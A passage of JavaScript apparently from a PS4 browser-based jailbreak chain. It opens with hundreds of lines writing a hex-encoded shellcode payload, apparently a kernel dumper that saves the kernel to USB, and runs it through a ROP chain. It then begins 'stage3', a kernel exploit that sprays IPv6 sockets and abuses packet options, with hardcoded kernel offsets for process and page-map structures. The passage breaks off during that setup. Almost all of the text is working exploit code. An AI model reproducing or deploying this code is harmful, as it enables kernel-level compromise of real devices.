  payload_writer[2063] = 0x48df89ff;
  payload_writer[2064] = 0x0c62158d;
  payload_writer[2065] = 0x8d480000;
  payload_writer[2066] = 0x00094935;
  payload_writer[2067] = 0xfaa2e800;
  payload_writer[2068] = 0xdf89ffff;
  payload_writer[2069] = 0xdd158d48;
  payload_writer[2070] = 0x4800000c;
  payload_writer[2071] = 0x093f358d;
  payload_writer[2072] = 0x8de80000;
  payload_writer[2073] = 0x89fffffa;
  payload_writer[2074] = 0x158d48df;
  payload_writer[2075] = 0x00000ca0;
  payload_writer[2076] = 0x31358d48;
  payload_writer[2077] = 0xe8000009;
  payload_writer[2078] = 0xfffffa78;
  payload_writer[2079] = 0x8d48df89;
  payload_writer[2080] = 0x000cf315;
  payload_writer[2081] = 0x358d4800;
  payload_writer[2082] = 0x00000922;
  payload_writer[2083] = 0xfffa63e8;
  payload_writer[2084] = 0x48df89ff;
  payload_writer[2085] = 0x0c46158d;
  payload_writer[2086] = 0x8d480000;
  payload_writer[2087] = 0x00090e35;
  payload_writer[2088] = 0xfa4ee800;
  payload_writer[2089] = 0xdf89ffff;
  payload_writer[2090] = 0x91158d48;
  payload_writer[2091] = 0x4800000b;
  payload_writer[2092] = 0x08fe358d;
  payload_writer[2093] = 0x39e80000;
  payload_writer[2094] = 0x89fffffa;
  payload_writer[2095] = 0x158d48df;
  payload_writer[2096] = 0x00000c94;
  payload_writer[2097] = 0xf1358d48;
  payload_writer[2098] = 0xe8000008;
  payload_writer[2099] = 0xfffffa24;
  payload_writer[2100] = 0x8d48df89;
  payload_writer[2101] = 0x000bdf15;
  payload_writer[2102] = 0x358d4800;
  payload_writer[2103] = 0x000008d6;
  payload_writer[2104] = 0xfffa0fe8;
  payload_writer[2105] = 0x48df89ff;
  payload_writer[2106] = 0x0cca158d;
  payload_writer[2107] = 0x8d480000;
  payload_writer[2108] = 0x0008c935;
  payload_writer[2109] = 0xf9fae800;
  payload_writer[2110] = 0xdf89ffff;
  payload_writer[2111] = 0x85158d48;
  payload_writer[2112] = 0x4800000c;
  payload_writer[2113] = 0x08ad358d;
  payload_writer[2114] = 0xe5e80000;
  payload_writer[2115] = 0x89fffff9;
  payload_writer[2116] = 0x158d48df;
  payload_writer[2117] = 0x00000cc8;
  payload_writer[2118] = 0xa7358d48;
  payload_writer[2119] = 0xe8000008;
  payload_writer[2120] = 0xfffff9d0;
  payload_writer[2121] = 0x8d48df89;
  payload_writer[2122] = 0x000c7315;
  payload_writer[2123] = 0x358d4800;
  payload_writer[2124] = 0x00000899;
  payload_writer[2125] = 0xfff9bbe8;
  payload_writer[2126] = 0x48df89ff;
  payload_writer[2127] = 0x0c1e158d;
  payload_writer[2128] = 0x8d480000;
  payload_writer[2129] = 0x00088d35;
  payload_writer[2130] = 0xf9a6e800;
  payload_writer[2131] = 0xdf89ffff;
  payload_writer[2132] = 0x69158d48;
  payload_writer[2133] = 0x4800000c;
  payload_writer[2134] = 0x0882358d;
  payload_writer[2135] = 0x91e80000;
  payload_writer[2136] = 0x89fffff9;
  payload_writer[2137] = 0x158d48df;
  payload_writer[2138] = 0x00000b64;
  payload_writer[2139] = 0x79358d48;
  payload_writer[2140] = 0xe8000008;
  payload_writer[2141] = 0xfffff97c;
  payload_writer[2142] = 0x8d48df89;
  payload_writer[2143] = 0x000c0f15;
  payload_writer[2144] = 0x358d4800;
  payload_writer[2145] = 0x0000086b;
  payload_writer[2146] = 0xfff967e8;
  payload_writer[2147] = 0x48df89ff;
  payload_writer[2148] = 0x0af2158d;
  payload_writer[2149] = 0x8d480000;
  payload_writer[2150] = 0x00085e35;
  payload_writer[2151] = 0xf952e800;
  payload_writer[2152] = 0xdf89ffff;
  payload_writer[2153] = 0xcd158d48;
  payload_writer[2154] = 0x4800000a;
  payload_writer[2155] = 0x0851358d;
  payload_writer[2156] = 0x3de80000;
  payload_writer[2157] = 0x89fffff9;
  payload_writer[2158] = 0x158d48df;
  payload_writer[2159] = 0x00000c40;
  payload_writer[2160] = 0x46358d48;
  payload_writer[2161] = 0xe8000008;
  payload_writer[2162] = 0xfffff928;
  payload_writer[2163] = 0x8d48df89;
  payload_writer[2164] = 0x000a8b15;
  payload_writer[2165] = 0x358d4800;
  payload_writer[2166] = 0x00000839;
  payload_writer[2167] = 0xfff913e8;
  payload_writer[2168] = 0x48df89ff;
  payload_writer[2169] = 0x0a7e158d;
  payload_writer[2170] = 0x8d480000;
  payload_writer[2171] = 0x00082c35;
  payload_writer[2172] = 0xf8fee800;
  payload_writer[2173] = 0xdf89ffff;
  payload_writer[2174] = 0xf9158d48;
  payload_writer[2175] = 0x4800000b;
  payload_writer[2176] = 0x0821358d;
  payload_writer[2177] = 0xe9e80000;
  payload_writer[2178] = 0x89fffff8;
  payload_writer[2179] = 0x158d48df;
  payload_writer[2180] = 0x00000ad4;
  payload_writer[2181] = 0x15358d48;
  payload_writer[2182] = 0xe8000008;
  payload_writer[2183] = 0xfffff8d4;
  payload_writer[2184] = 0x8d48df89;
  payload_writer[2185] = 0x000a5715;
  payload_writer[2186] = 0x358d4800;
  payload_writer[2187] = 0x00000806;
  payload_writer[2188] = 0xfff8bfe8;
  payload_writer[2189] = 0x48df89ff;
  payload_writer[2190] = 0x0b12158d;
  payload_writer[2191] = 0x8d480000;
  payload_writer[2192] = 0x0007fd35;
  payload_writer[2193] = 0xf8aae800;
  payload_writer[2194] = 0xdf89ffff;
  payload_writer[2195] = 0xdd158d48;
  payload_writer[2196] = 0x4800000a;
  payload_writer[2197] = 0x07ee358d;
  payload_writer[2198] = 0x95e80000;
  payload_writer[2199] = 0x89fffff8;
  payload_writer[2200] = 0x158d48df;
  payload_writer[2201] = 0x00000b68;
  payload_writer[2202] = 0xdf358d48;
  payload_writer[2203] = 0xe8000007;
  payload_writer[2204] = 0xfffff880;
  payload_writer[2205] = 0x8d48df89;
  payload_writer[2206] = 0x000a4b15;
  payload_writer[2207] = 0x358d4800;
  payload_writer[2208] = 0x000007d1;
  payload_writer[2209] = 0xfff86be8;
  payload_writer[2210] = 0x48df89ff;
  payload_writer[2211] = 0x0ade158d;
  payload_writer[2212] = 0x8d480000;
  payload_writer[2213] = 0x0007c235;
  payload_writer[2214] = 0xf856e800;
  payload_writer[2215] = 0xdf89ffff;
  payload_writer[2216] = 0xd9158d48;
  payload_writer[2217] = 0x4800000a;
  payload_writer[2218] = 0x07b3358d;
  payload_writer[2219] = 0x41e80000;
  payload_writer[2220] = 0x89fffff8;
  payload_writer[2221] = 0x8d485bdf;
  payload_writer[2222] = 0x0009f315;
  payload_writer[2223] = 0x358d4800;
  payload_writer[2224] = 0x000007a4;
  payload_writer[2225] = 0xfff82be9;
  payload_writer[2226] = 0xc03148ff;
  payload_writer[2227] = 0x0fca8949;
  payload_writer[2228] = 0xc3017205;
  payload_writer[2229] = 0x243d8348;
  payload_writer[2230] = 0x00000008;
  payload_writer[2231] = 0xff501874;
  payload_writer[2232] = 0x00081b15;
  payload_writer[2233] = 0x08895900;
  payload_writer[2234] = 0xffc0c748;
  payload_writer[2235] = 0x48ffffff;
  payload_writer[2236] = 0xffffc2c7;
  payload_writer[2237] = 0x52c3ffff;
  payload_writer[2238] = 0x696e6e75;
  payload_writer[2239] = 0x5020676e;
  payload_writer[2240] = 0x4b203453;
  payload_writer[2241] = 0x656e7265;
  payload_writer[2242] = 0x7544206c;
  payload_writer[2243] = 0x7265706d;
  payload_writer[2244] = 0x206f4e00;
  payload_writer[2245] = 0x20425355;
  payload_writer[2246] = 0x726f7473;
  payload_writer[2247] = 0x20656761;
  payload_writer[2248] = 0x69766564;
  payload_writer[2249] = 0x64206563;
  payload_writer[2250] = 0x63657465;
  payload_writer[2251] = 0x2e646574;
  payload_writer[2252] = 0x656c500a;
  payload_writer[2253] = 0x20657361;
  payload_writer[2254] = 0x6e6e6f63;
  payload_writer[2255] = 0x20746365;
  payload_writer[2256] = 0x2e656e6f;
  payload_writer[2257] = 0x6e6d2f00;
  payload_writer[2258] = 0x73752f74;
  payload_writer[2259] = 0x2f692562;
  payload_writer[2260] = 0x6e72656b;
  payload_writer[2261] = 0x645f6c65;
  payload_writer[2262] = 0x5f706d75;
  payload_writer[2263] = 0x255f7766;
  payload_writer[2264] = 0x2e583330;
  payload_writer[2265] = 0x006e6962;
  payload_writer[2266] = 0x4253550a;
  payload_writer[2267] = 0x76656420;
  payload_writer[2268] = 0x20656369;
  payload_writer[2269] = 0x65746564;
  payload_writer[2270] = 0x64657463;
  payload_writer[2271] = 0x530a0a2e;
  payload_writer[2272] = 0x74726174;
  payload_writer[2273] = 0x20676e69;
  payload_writer[2274] = 0x6e72656b;
  payload_writer[2275] = 0x64206c65;
  payload_writer[2276] = 0x69706d75;
  payload_writer[2277] = 0x7420676e;
  payload_writer[2278] = 0x5355206f;
  payload_writer[2279] = 0x2e692542;
  payload_writer[2280] = 0x72654b00;
  payload_writer[2281] = 0x206c656e;
  payload_writer[2282] = 0x706d7564;
  payload_writer[2283] = 0x20676e69;
  payload_writer[2284] = 0x55206f74;
  payload_writer[2285] = 0x69254253;
  payload_writer[2286] = 0x6e6f440a;
  payload_writer[2287] = 0x25203a65;
  payload_writer[2288] = 0x00252569;
  payload_writer[2289] = 0x6e72654b;
  payload_writer[2290] = 0x64206c65;
  payload_writer[2291] = 0x65706d75;
  payload_writer[2292] = 0x75732064;
  payload_writer[2293] = 0x73656363;
  payload_writer[2294] = 0x6c756673;
  payload_writer[2295] = 0x0021796c;
  payload_writer[2296] = 0x6b62696c;
  payload_writer[2297] = 0x656e7265;
  payload_writer[2298] = 0x65775f6c;
  payload_writer[2299] = 0x70732e62;
  payload_writer[2300] = 0x6c007872;
  payload_writer[2301] = 0x656b6269;
  payload_writer[2302] = 0x6c656e72;
  payload_writer[2303] = 0x7379735f;
  payload_writer[2304] = 0x7270732e;
  payload_writer[2305] = 0x5f5f0078;
  payload_writer[2306] = 0x63617473;
  payload_writer[2307] = 0x68635f6b;
  payload_writer[2308] = 0x75675f6b;
  payload_writer[2309] = 0x00647261;
  payload_writer[2310] = 0x74735f5f;
  payload_writer[2311] = 0x5f6b6361;
  payload_writer[2312] = 0x5f6b6863;
  payload_writer[2313] = 0x6c696166;
  payload_writer[2314] = 0x655f5f00;
  payload_writer[2315] = 0x726f7272;
  payload_writer[2316] = 0x65637300;
  payload_writer[2317] = 0x6e72654b;
  payload_writer[2318] = 0x72456c65;
  payload_writer[2319] = 0x00726f72;
  payload_writer[2320] = 0x4b656373;
  payload_writer[2321] = 0x656e7265;
  payload_writer[2322] = 0x616f4c6c;
  payload_writer[2323] = 0x61745364;
  payload_writer[2324] = 0x6f4d7472;
  payload_writer[2325] = 0x656c7564;
  payload_writer[2326] = 0x65637300;
  payload_writer[2327] = 0x6e72654b;
  payload_writer[2328] = 0x6c416c65;
  payload_writer[2329] = 0x61636f6c;
  payload_writer[2330] = 0x69446574;
  payload_writer[2331] = 0x74636572;
  payload_writer[2332] = 0x6f6d654d;
  payload_writer[2333] = 0x73007972;
  payload_writer[2334] = 0x654b6563;
  payload_writer[2335] = 0x6c656e72;
  payload_writer[2336] = 0x4470614d;
  payload_writer[2337] = 0x63657269;
  payload_writer[2338] = 0x6d654d74;
  payload_writer[2339] = 0x0079726f;
  payload_writer[2340] = 0x4b656373;
  payload_writer[2341] = 0x656e7265;
  payload_writer[2342] = 0x7465476c;
  payload_writer[2343] = 0x65726944;
  payload_writer[2344] = 0x654d7463;
  payload_writer[2345] = 0x79726f6d;
  payload_writer[2346] = 0x657a6953;
  payload_writer[2347] = 0x65637300;
  payload_writer[2348] = 0x6e72654b;
  payload_writer[2349] = 0x74536c65;
  payload_writer[2350] = 0x73007461;
  payload_writer[2351] = 0x654b6563;
  payload_writer[2352] = 0x6c656e72;
  payload_writer[2353] = 0x6e65704f;
  payload_writer[2354] = 0x65637300;
  payload_writer[2355] = 0x6e72654b;
  payload_writer[2356] = 0x65526c65;
  payload_writer[2357] = 0x73006461;
  payload_writer[2358] = 0x654b6563;
  payload_writer[2359] = 0x6c656e72;
  payload_writer[2360] = 0x6565734c;
  payload_writer[2361] = 0x6373006b;
  payload_writer[2362] = 0x72654b65;
  payload_writer[2363] = 0x436c656e;
  payload_writer[2364] = 0x65736f6c;
  payload_writer[2365] = 0x65637300;
  payload_writer[2366] = 0x6e72654b;
  payload_writer[2367] = 0x6c536c65;
  payload_writer[2368] = 0x00706565;
  payload_writer[2369] = 0x4b656373;
  payload_writer[2370] = 0x656e7265;
  payload_writer[2371] = 0x6c73556c;
  payload_writer[2372] = 0x00706565;
  payload_writer[2373] = 0x4b656373;
  payload_writer[2374] = 0x656e7265;
  payload_writer[2375] = 0x7465476c;
  payload_writer[2376] = 0x656d6974;
  payload_writer[2377] = 0x6164666f;
  payload_writer[2378] = 0x63730079;
  payload_writer[2379] = 0x72654b65;
  payload_writer[2380] = 0x476c656e;
  payload_writer[2381] = 0x72507465;
  payload_writer[2382] = 0x7365636f;
  payload_writer[2383] = 0x6d695473;
  payload_writer[2384] = 0x63730065;
  payload_writer[2385] = 0x72654b65;
  payload_writer[2386] = 0x476c656e;
  payload_writer[2387] = 0x75437465;
  payload_writer[2388] = 0x6e657272;
  payload_writer[2389] = 0x75704374;
  payload_writer[2390] = 0x73797300;
  payload_writer[2391] = 0x006c7463;
  payload_writer[2392] = 0x63737973;
  payload_writer[2393] = 0x79626c74;
  payload_writer[2394] = 0x656d616e;
  payload_writer[2395] = 0x73797300;
  payload_writer[2396] = 0x68637261;
  payload_writer[2397] = 0x65786500;
  payload_writer[2398] = 0x00657663;
  payload_writer[2399] = 0x72687470;
  payload_writer[2400] = 0x5f646165;
  payload_writer[2401] = 0x666c6573;
  payload_writer[2402] = 0x68747000;
  payload_writer[2403] = 0x64616572;
  payload_writer[2404] = 0x7465735f;
  payload_writer[2405] = 0x69666661;
  payload_writer[2406] = 0x7974696e;
  payload_writer[2407] = 0x00706e5f;
  payload_writer[2408] = 0x4b656373;
  payload_writer[2409] = 0x656e7265;
  payload_writer[2410] = 0x6572436c;
  payload_writer[2411] = 0x45657461;
  payload_writer[2412] = 0x75657571;
  payload_writer[2413] = 0x63730065;
  payload_writer[2414] = 0x72654b65;
  payload_writer[2415] = 0x446c656e;
  payload_writer[2416] = 0x74656c65;
  payload_writer[2417] = 0x75714565;
  payload_writer[2418] = 0x00657565;
  payload_writer[2419] = 0x4b656373;
  payload_writer[2420] = 0x656e7265;
  payload_writer[2421] = 0x6464416c;
  payload_writer[2422] = 0x72657355;
  payload_writer[2423] = 0x6e657645;
  payload_writer[2424] = 0x63730074;
  payload_writer[2425] = 0x72654b65;
  payload_writer[2426] = 0x416c656e;
  payload_writer[2427] = 0x65526464;
  payload_writer[2428] = 0x76456461;
  payload_writer[2429] = 0x00746e65;
  payload_writer[2430] = 0x75746567;
  payload_writer[2431] = 0x67006469;
  payload_writer[2432] = 0x69677465;
  payload_writer[2433] = 0x65670064;
  payload_writer[2434] = 0x64697074;
  payload_writer[2435] = 0x74657300;
  payload_writer[2436] = 0x00646975;
  payload_writer[2437] = 0x67746573;
  payload_writer[2438] = 0x73006469;
  payload_writer[2439] = 0x65727465;
  payload_writer[2440] = 0x00646975;
  payload_writer[2441] = 0x72746573;
  payload_writer[2442] = 0x64696765;
  payload_writer[2443] = 0x79732f00;
  payload_writer[2444] = 0x6d657473;
  payload_writer[2445] = 0x6d6f632f;
  payload_writer[2446] = 0x2f6e6f6d;
  payload_writer[2447] = 0x2f62696c;
  payload_writer[2448] = 0x5362696c;
  payload_writer[2449] = 0x79536563;
  payload_writer[2450] = 0x69745573;
  payload_writer[2451] = 0x70732e6c;
  payload_writer[2452] = 0x2f007872;
  payload_writer[2453] = 0x74737973;
  payload_writer[2454] = 0x632f6d65;
  payload_writer[2455] = 0x6f6d6d6f;
  payload_writer[2456] = 0x696c2f6e;
  payload_writer[2457] = 0x696c2f62;
  payload_writer[2458] = 0x65635362;
  payload_writer[2459] = 0x74737953;
  payload_writer[2460] = 0x65536d65;
  payload_writer[2461] = 0x63697672;
  payload_writer[2462] = 0x70732e65;
  payload_writer[2463] = 0x73007872;
  payload_writer[2464] = 0x79536563;
  payload_writer[2465] = 0x69745573;
  payload_writer[2466] = 0x6e65536c;
  payload_writer[2467] = 0x73795364;
  payload_writer[2468] = 0x4e6d6574;
  payload_writer[2469] = 0x6669746f;
  payload_writer[2470] = 0x74616369;
  payload_writer[2471] = 0x576e6f69;
  payload_writer[2472] = 0x54687469;
  payload_writer[2473] = 0x00747865;
  payload_writer[2474] = 0x53656373;
  payload_writer[2475] = 0x65747379;
  payload_writer[2476] = 0x7265536d;
  payload_writer[2477] = 0x65636976;
  payload_writer[2478] = 0x6e75614c;
  payload_writer[2479] = 0x65576863;
  payload_writer[2480] = 0x6f724262;
  payload_writer[2481] = 0x72657377;
  payload_writer[2482] = 0x00732500;
  payload_writer[2483] = 0x7379732f;
  payload_writer[2484] = 0x2f6d6574;
  payload_writer[2485] = 0x6d6d6f63;
  payload_writer[2486] = 0x6c2f6e6f;
  payload_writer[2487] = 0x6c2f6269;
  payload_writer[2488] = 0x63536269;
  payload_writer[2489] = 0x65735565;
  payload_writer[2490] = 0x72655372;
  payload_writer[2491] = 0x65636976;
  payload_writer[2492] = 0x7270732e;
  payload_writer[2493] = 0x63730078;
  payload_writer[2494] = 0x65735565;
  payload_writer[2495] = 0x72655372;
  payload_writer[2496] = 0x65636976;
  payload_writer[2497] = 0x74696e49;
  payload_writer[2498] = 0x696c6169;
  payload_writer[2499] = 0x7300657a;
  payload_writer[2500] = 0x73556563;
  payload_writer[2501] = 0x65537265;
  payload_writer[2502] = 0x63697672;
  payload_writer[2503] = 0x74654765;
  payload_writer[2504] = 0x69676f4c;
  payload_writer[2505] = 0x6573556e;
  payload_writer[2506] = 0x4c644972;
  payload_writer[2507] = 0x00747369;
  payload_writer[2508] = 0x55656373;
  payload_writer[2509] = 0x53726573;
  payload_writer[2510] = 0x69767265;
  payload_writer[2511] = 0x65546563;
  payload_writer[2512] = 0x6e696d72;
  payload_writer[2513] = 0x00657461;
  payload_writer[2514] = 0x55656373;
  payload_writer[2515] = 0x53726573;
  payload_writer[2516] = 0x69767265;
  payload_writer[2517] = 0x65476563;
  payload_writer[2518] = 0x65735574;
  payload_writer[2519] = 0x6d614e72;
  payload_writer[2520] = 0x63730065;
  payload_writer[2521] = 0x65735565;
  payload_writer[2522] = 0x72655372;
  payload_writer[2523] = 0x65636976;
  payload_writer[2524] = 0x49746547;
  payload_writer[2525] = 0x6974696e;
  payload_writer[2526] = 0x73556c61;
  payload_writer[2527] = 0x53007265;
  payload_writer[2528] = 0x79536563;
  payload_writer[2529] = 0x726f4373;
  payload_writer[2530] = 0x62655265;
  payload_writer[2531] = 0x00746f6f;
  payload_writer[2532] = 0x7379732f;
  payload_writer[2533] = 0x2f6d6574;
  payload_writer[2534] = 0x6d6d6f63;
  payload_writer[2535] = 0x6c2f6e6f;
  payload_writer[2536] = 0x6c2f6269;
  payload_writer[2537] = 0x656b6269;
  payload_writer[2538] = 0x6c656e72;
  payload_writer[2539] = 0x7270732e;
  payload_writer[2540] = 0x63730078;
  payload_writer[2541] = 0x72654b65;
  payload_writer[2542] = 0x526c656e;
  payload_writer[2543] = 0x6f6f6265;
  payload_writer[2544] = 0x63730074;
  payload_writer[2545] = 0x68745065;
  payload_writer[2546] = 0x64616572;
  payload_writer[2547] = 0x61657243;
  payload_writer[2548] = 0x73006574;
  payload_writer[2549] = 0x74506563;
  payload_writer[2550] = 0x61657268;
  payload_writer[2551] = 0x69784564;
  payload_writer[2552] = 0x63730074;
  payload_writer[2553] = 0x68745065;
  payload_writer[2554] = 0x64616572;
  payload_writer[2555] = 0x61746544;
  payload_writer[2556] = 0x73006863;
  payload_writer[2557] = 0x74506563;
  payload_writer[2558] = 0x61657268;
  payload_writer[2559] = 0x696f4a64;
  payload_writer[2560] = 0x6373006e;
  payload_writer[2561] = 0x68745065;
  payload_writer[2562] = 0x64616572;
  payload_writer[2563] = 0x6c656959;
  payload_writer[2564] = 0x63730064;
  payload_writer[2565] = 0x68745065;
  payload_writer[2566] = 0x64616572;
  payload_writer[2567] = 0x666c6553;
  payload_writer[2568] = 0x65637300;
  payload_writer[2569] = 0x72687450;
  payload_writer[2570] = 0x43646165;
  payload_writer[2571] = 0x65636e61;
  payload_writer[2572] = 0x6373006c;
  payload_writer[2573] = 0x68745065;
  payload_writer[2574] = 0x64616572;
  payload_writer[2575] = 0x6574754d;
  payload_writer[2576] = 0x696e4978;
  payload_writer[2577] = 0x63730074;
  payload_writer[2578] = 0x68745065;
  payload_writer[2579] = 0x64616572;
  payload_writer[2580] = 0x6574754d;
  payload_writer[2581] = 0x73654478;
  payload_writer[2582] = 0x796f7274;
  payload_writer[2583] = 0x65637300;
  payload_writer[2584] = 0x72687450;
  payload_writer[2585] = 0x4d646165;
  payload_writer[2586] = 0x78657475;
  payload_writer[2587] = 0x6b636f4c;
  payload_writer[2588] = 0x65637300;
  payload_writer[2589] = 0x72687450;
  payload_writer[2590] = 0x4d646165;
  payload_writer[2591] = 0x78657475;
  payload_writer[2592] = 0x6c797254;
  payload_writer[2593] = 0x006b636f;
  payload_writer[2594] = 0x50656373;
  payload_writer[2595] = 0x65726874;
  payload_writer[2596] = 0x754d6461;
  payload_writer[2597] = 0x54786574;
  payload_writer[2598] = 0x64656d69;
  payload_writer[2599] = 0x6b636f6c;
  payload_writer[2600] = 0x65637300;
  payload_writer[2601] = 0x72687450;
  payload_writer[2602] = 0x4d646165;
  payload_writer[2603] = 0x78657475;
  payload_writer[2604] = 0x6f6c6e55;
  payload_writer[2605] = 0x6c006b63;
  payload_writer[2606] = 0x63536269;
  payload_writer[2607] = 0x62694c65;
  payload_writer[2608] = 0x746e4963;
  payload_writer[2609] = 0x616e7265;
  payload_writer[2610] = 0x70732e6c;
  payload_writer[2611] = 0x6d007872;
  payload_writer[2612] = 0x6f6c6c61;
  payload_writer[2613] = 0x72660063;
  payload_writer[2614] = 0x63006565;
  payload_writer[2615] = 0x6f6c6c61;
  payload_writer[2616] = 0x65720063;
  payload_writer[2617] = 0x6f6c6c61;
  payload_writer[2618] = 0x656d0063;
  payload_writer[2619] = 0x696c616d;
  payload_writer[2620] = 0x6d006e67;
  payload_writer[2621] = 0x65736d65;
  payload_writer[2622] = 0x656d0074;
  payload_writer[2623] = 0x7970636d;
  payload_writer[2624] = 0x6d656d00;
  payload_writer[2625] = 0x00706d63;
  payload_writer[2626] = 0x63727473;
  payload_writer[2627] = 0x73007970;
  payload_writer[2628] = 0x636e7274;
  payload_writer[2629] = 0x73007970;
  payload_writer[2630] = 0x61637274;
  payload_writer[2631] = 0x74730074;
  payload_writer[2632] = 0x61636e72;
  payload_writer[2633] = 0x74730074;
  payload_writer[2634] = 0x6e656c72;
  payload_writer[2635] = 0x72747300;
  payload_writer[2636] = 0x00706d63;
  payload_writer[2637] = 0x6e727473;
  payload_writer[2638] = 0x00706d63;
  payload_writer[2639] = 0x69727073;
  payload_writer[2640] = 0x0066746e;
  payload_writer[2641] = 0x72706e73;
  payload_writer[2642] = 0x66746e69;
  payload_writer[2643] = 0x63737300;
  payload_writer[2644] = 0x00666e61;
  payload_writer[2645] = 0x63727473;
  payload_writer[2646] = 0x73007268;
  payload_writer[2647] = 0x63727274;
  payload_writer[2648] = 0x73007268;
  payload_writer[2649] = 0x74737274;
  payload_writer[2650] = 0x74730072;
  payload_writer[2651] = 0x70756472;
  payload_writer[2652] = 0x6e697200;
  payload_writer[2653] = 0x00786564;
  payload_writer[2654] = 0x69647369;
  payload_writer[2655] = 0x00746967;
  payload_writer[2656] = 0x696f7461;
  payload_writer[2657] = 0x72747300;
  payload_writer[2658] = 0x7970636c;
  payload_writer[2659] = 0x72747300;
  payload_writer[2660] = 0x6f727265;
  payload_writer[2661] = 0x475f0072;
  payload_writer[2662] = 0x63707465;
  payload_writer[2663] = 0x65707974;
  payload_writer[2664] = 0x74535f00;
  payload_writer[2665] = 0x006c756f;
  payload_writer[2666] = 0x706f6362;
  payload_writer[2667] = 0x72730079;
  payload_writer[2668] = 0x00646e61;
  payload_writer[2669] = 0x74637361;
  payload_writer[2670] = 0x00656d69;
  payload_writer[2671] = 0x74637361;
  payload_writer[2672] = 0x5f656d69;
  payload_writer[2673] = 0x6d670072;
  payload_writer[2674] = 0x656d6974;
  payload_writer[2675] = 0x746d6700;
  payload_writer[2676] = 0x5f656d69;
  payload_writer[2677] = 0x6f6c0073;
  payload_writer[2678] = 0x746c6163;
  payload_writer[2679] = 0x00656d69;
  payload_writer[2680] = 0x61636f6c;
  payload_writer[2681] = 0x6d69746c;
  payload_writer[2682] = 0x00725f65;
  payload_writer[2683] = 0x69746b6d;
  payload_writer[2684] = 0x6f00656d;
  payload_writer[2685] = 0x646e6570;
  payload_writer[2686] = 0x72007269;
  payload_writer[2687] = 0x64646165;
  payload_writer[2688] = 0x72007269;
  payload_writer[2689] = 0x64646165;
  payload_writer[2690] = 0x725f7269;
  payload_writer[2691] = 0x6c657400;
  payload_writer[2692] = 0x7269646c;
  payload_writer[2693] = 0x65657300;
  payload_writer[2694] = 0x7269646b;
  payload_writer[2695] = 0x77657200;
  payload_writer[2696] = 0x64646e69;
  payload_writer[2697] = 0x63007269;
  payload_writer[2698] = 0x65736f6c;
  payload_writer[2699] = 0x00726964;
  payload_writer[2700] = 0x66726964;
  payload_writer[2701] = 0x65670064;
  payload_writer[2702] = 0x6f727074;
  payload_writer[2703] = 0x6d616e67;
  payload_writer[2704] = 0x6f660065;
  payload_writer[2705] = 0x006e6570;
  payload_writer[2706] = 0x61657266;
  payload_writer[2707] = 0x77660064;
  payload_writer[2708] = 0x65746972;
  payload_writer[2709] = 0x65736600;
  payload_writer[2710] = 0x66006b65;
  payload_writer[2711] = 0x6c6c6574;
  payload_writer[2712] = 0x6c636600;
  payload_writer[2713] = 0x0065736f;
  payload_writer[2714] = 0x69727066;
  payload_writer[2715] = 0x0066746e;




	chain.call(payload_buffer);
	/*
    var loader_thr = chain.spawn_thread("loader_thr", function (new_thr) {
      new_thr.push(payload_buffer);
      new_thr.fcall(libKernelBase.add32(OFFSET_lk_pthread_exit), 0);
    });
    loader_thr();
  */
}

function stage3() {

  const AF_INET6 = 28;
  const SOCK_DGRAM = 2;
  const IPPROTO_UDP = 17;
  const IPPROTO_IPV6 = 41;
  const IPV6_TCLASS = 61;
  const IPV6_2292PKTOPTIONS = 25;
  const IPV6_RTHDR = 51;
  const IPV6_PKTINFO = 46;

  const SPRAY_TCLASS = 0x53;
  const TAINT_CLASS = 0x58;
  const TCLASS_MASTER = 0x2AFE0000;

  const PKTOPTS_PKTINFO_OFFSET = 0x10;
  const PKTOPTS_RTHDR_OFFSET = 0x68;
  const PKTOPTS_TCLASS_OFFSET = 0xB0;

  const PROC_UCRED_OFFSET = 0x40;
  const PROC_FILEDESC_OFFSET = 0x48;
  const PROC_PID_OFFSET = 0xB0;


  const FILE_FOPS_OFFSET = 0x8;
  const FILEOPS_IOCTL_OFFSET = 0x18;
  const VM_MAP_PMAP_OFFSET = 0x120;

  const KERNEL_M_IP6OPT_OFFSET = 0x1A7AEA0;
  const KERNEL_MALLOC_OFFSET = 0x301840;
  const KERNEL_ALLPROC_OFFSET = 0x1B48318;
  const KERNEL_PMAP_STORE_OFFSET = 0x22C5268;

  const NUM_SPRAY_SOCKS = 200;
  const NUM_LEAK_SOCKS = 200;
  const NUM_SLAVE_SOCKS = 300;

  const size_of_triggered = 0x8;
  const size_of_valid_pktopts = 0x18;
  const size_of_size_of_tclass = 0x8;
  const size_of_master_main_tclass = 0x8;
  const size_of_master_thr1_tclass = 0x8;
  const size_of_master_thr2_tclass = 0x8;
  const size_of_spray_tclass = 0x8;
  const size_of_taint_tclass = 0x8;
  const size_of_tmp_tclass = 0x8;
  const size_of_rthdr_buffer = 0x800;
  const size_of_ptr_size_of_rthdr_buffer= 0x8;
  const size_of_spray_socks = 0x4 * NUM_SPRAY_SOCKS;
  const size_of_leak_socks = 0x4 * NUM_LEAK_SOCKS;
  const size_of_slave_socks = 0x4 * NUM_SLAVE_SOCKS;
  const size_of_spray_socks_tclasses = 0x4 * NUM_SPRAY_SOCKS;
  const size_of_pktinfo_buffer = 0x18;
  const size_of_pktinfo_buffer_len = 0x8;
  const size_of_find_slave_buffer = 0x8 * NUM_SLAVE_SOCKS + 0x10;
  const size_of_fake_socketops = 0x58;
  const size_of_loop_counter = 0x8;
  const size_of_fix_these_sockets = 0x4 * (NUM_SPRAY_SOCKS + NUM_LEAK_SOCKS + NUM_SLAVE_SOCKS + 0x2) + 0x18;
  const var_memory = p.malloc(size_of_triggered + size_of_valid_pktopts + size_of_size_of_tclass + size_of_master_main_tclass + size_of_master_thr1_tclass + size_of_master_thr2_tclass + size_of_spray_tclass + size_of_taint_tclass + size_of_tmp_tclass +
    size_of_rthdr_buffer + size_of_ptr_size_of_rthdr_buffer+ size_of_spray_socks + size_of_leak_socks + size_of_slave_socks + size_of_spray_socks_tclasses + size_of_pktinfo_buffer + size_of_pktinfo_buffer_len + size_of_find_slave_buffer + size_of_fake_socketops + size_of_loop_counter +
    size_of_fix_these_sockets
  );

  const triggered = var_memory;
  const valid_pktopts = triggered.add32(size_of_triggered);
  const size_of_tclass = valid_pktopts.add32(size_of_valid_pktopts);
  const master_main_tclass = size_of_tclass.add32(size_of_size_of_tclass);
  const master_thr1_tclass = master_main_tclass.add32(size_of_master_main_tclass);
  const master_thr2_tclass = master_thr1_tclass.add32(size_of_master_thr1_tclass);
  const spray_tclass = master_thr2_tclass.add32(size_of_master_thr2_tclass);
  const taint_tclass = spray_tclass.add32(size_of_spray_tclass);
  const tmp_tclass = taint_tclass.add32(size_of_taint_tclass);
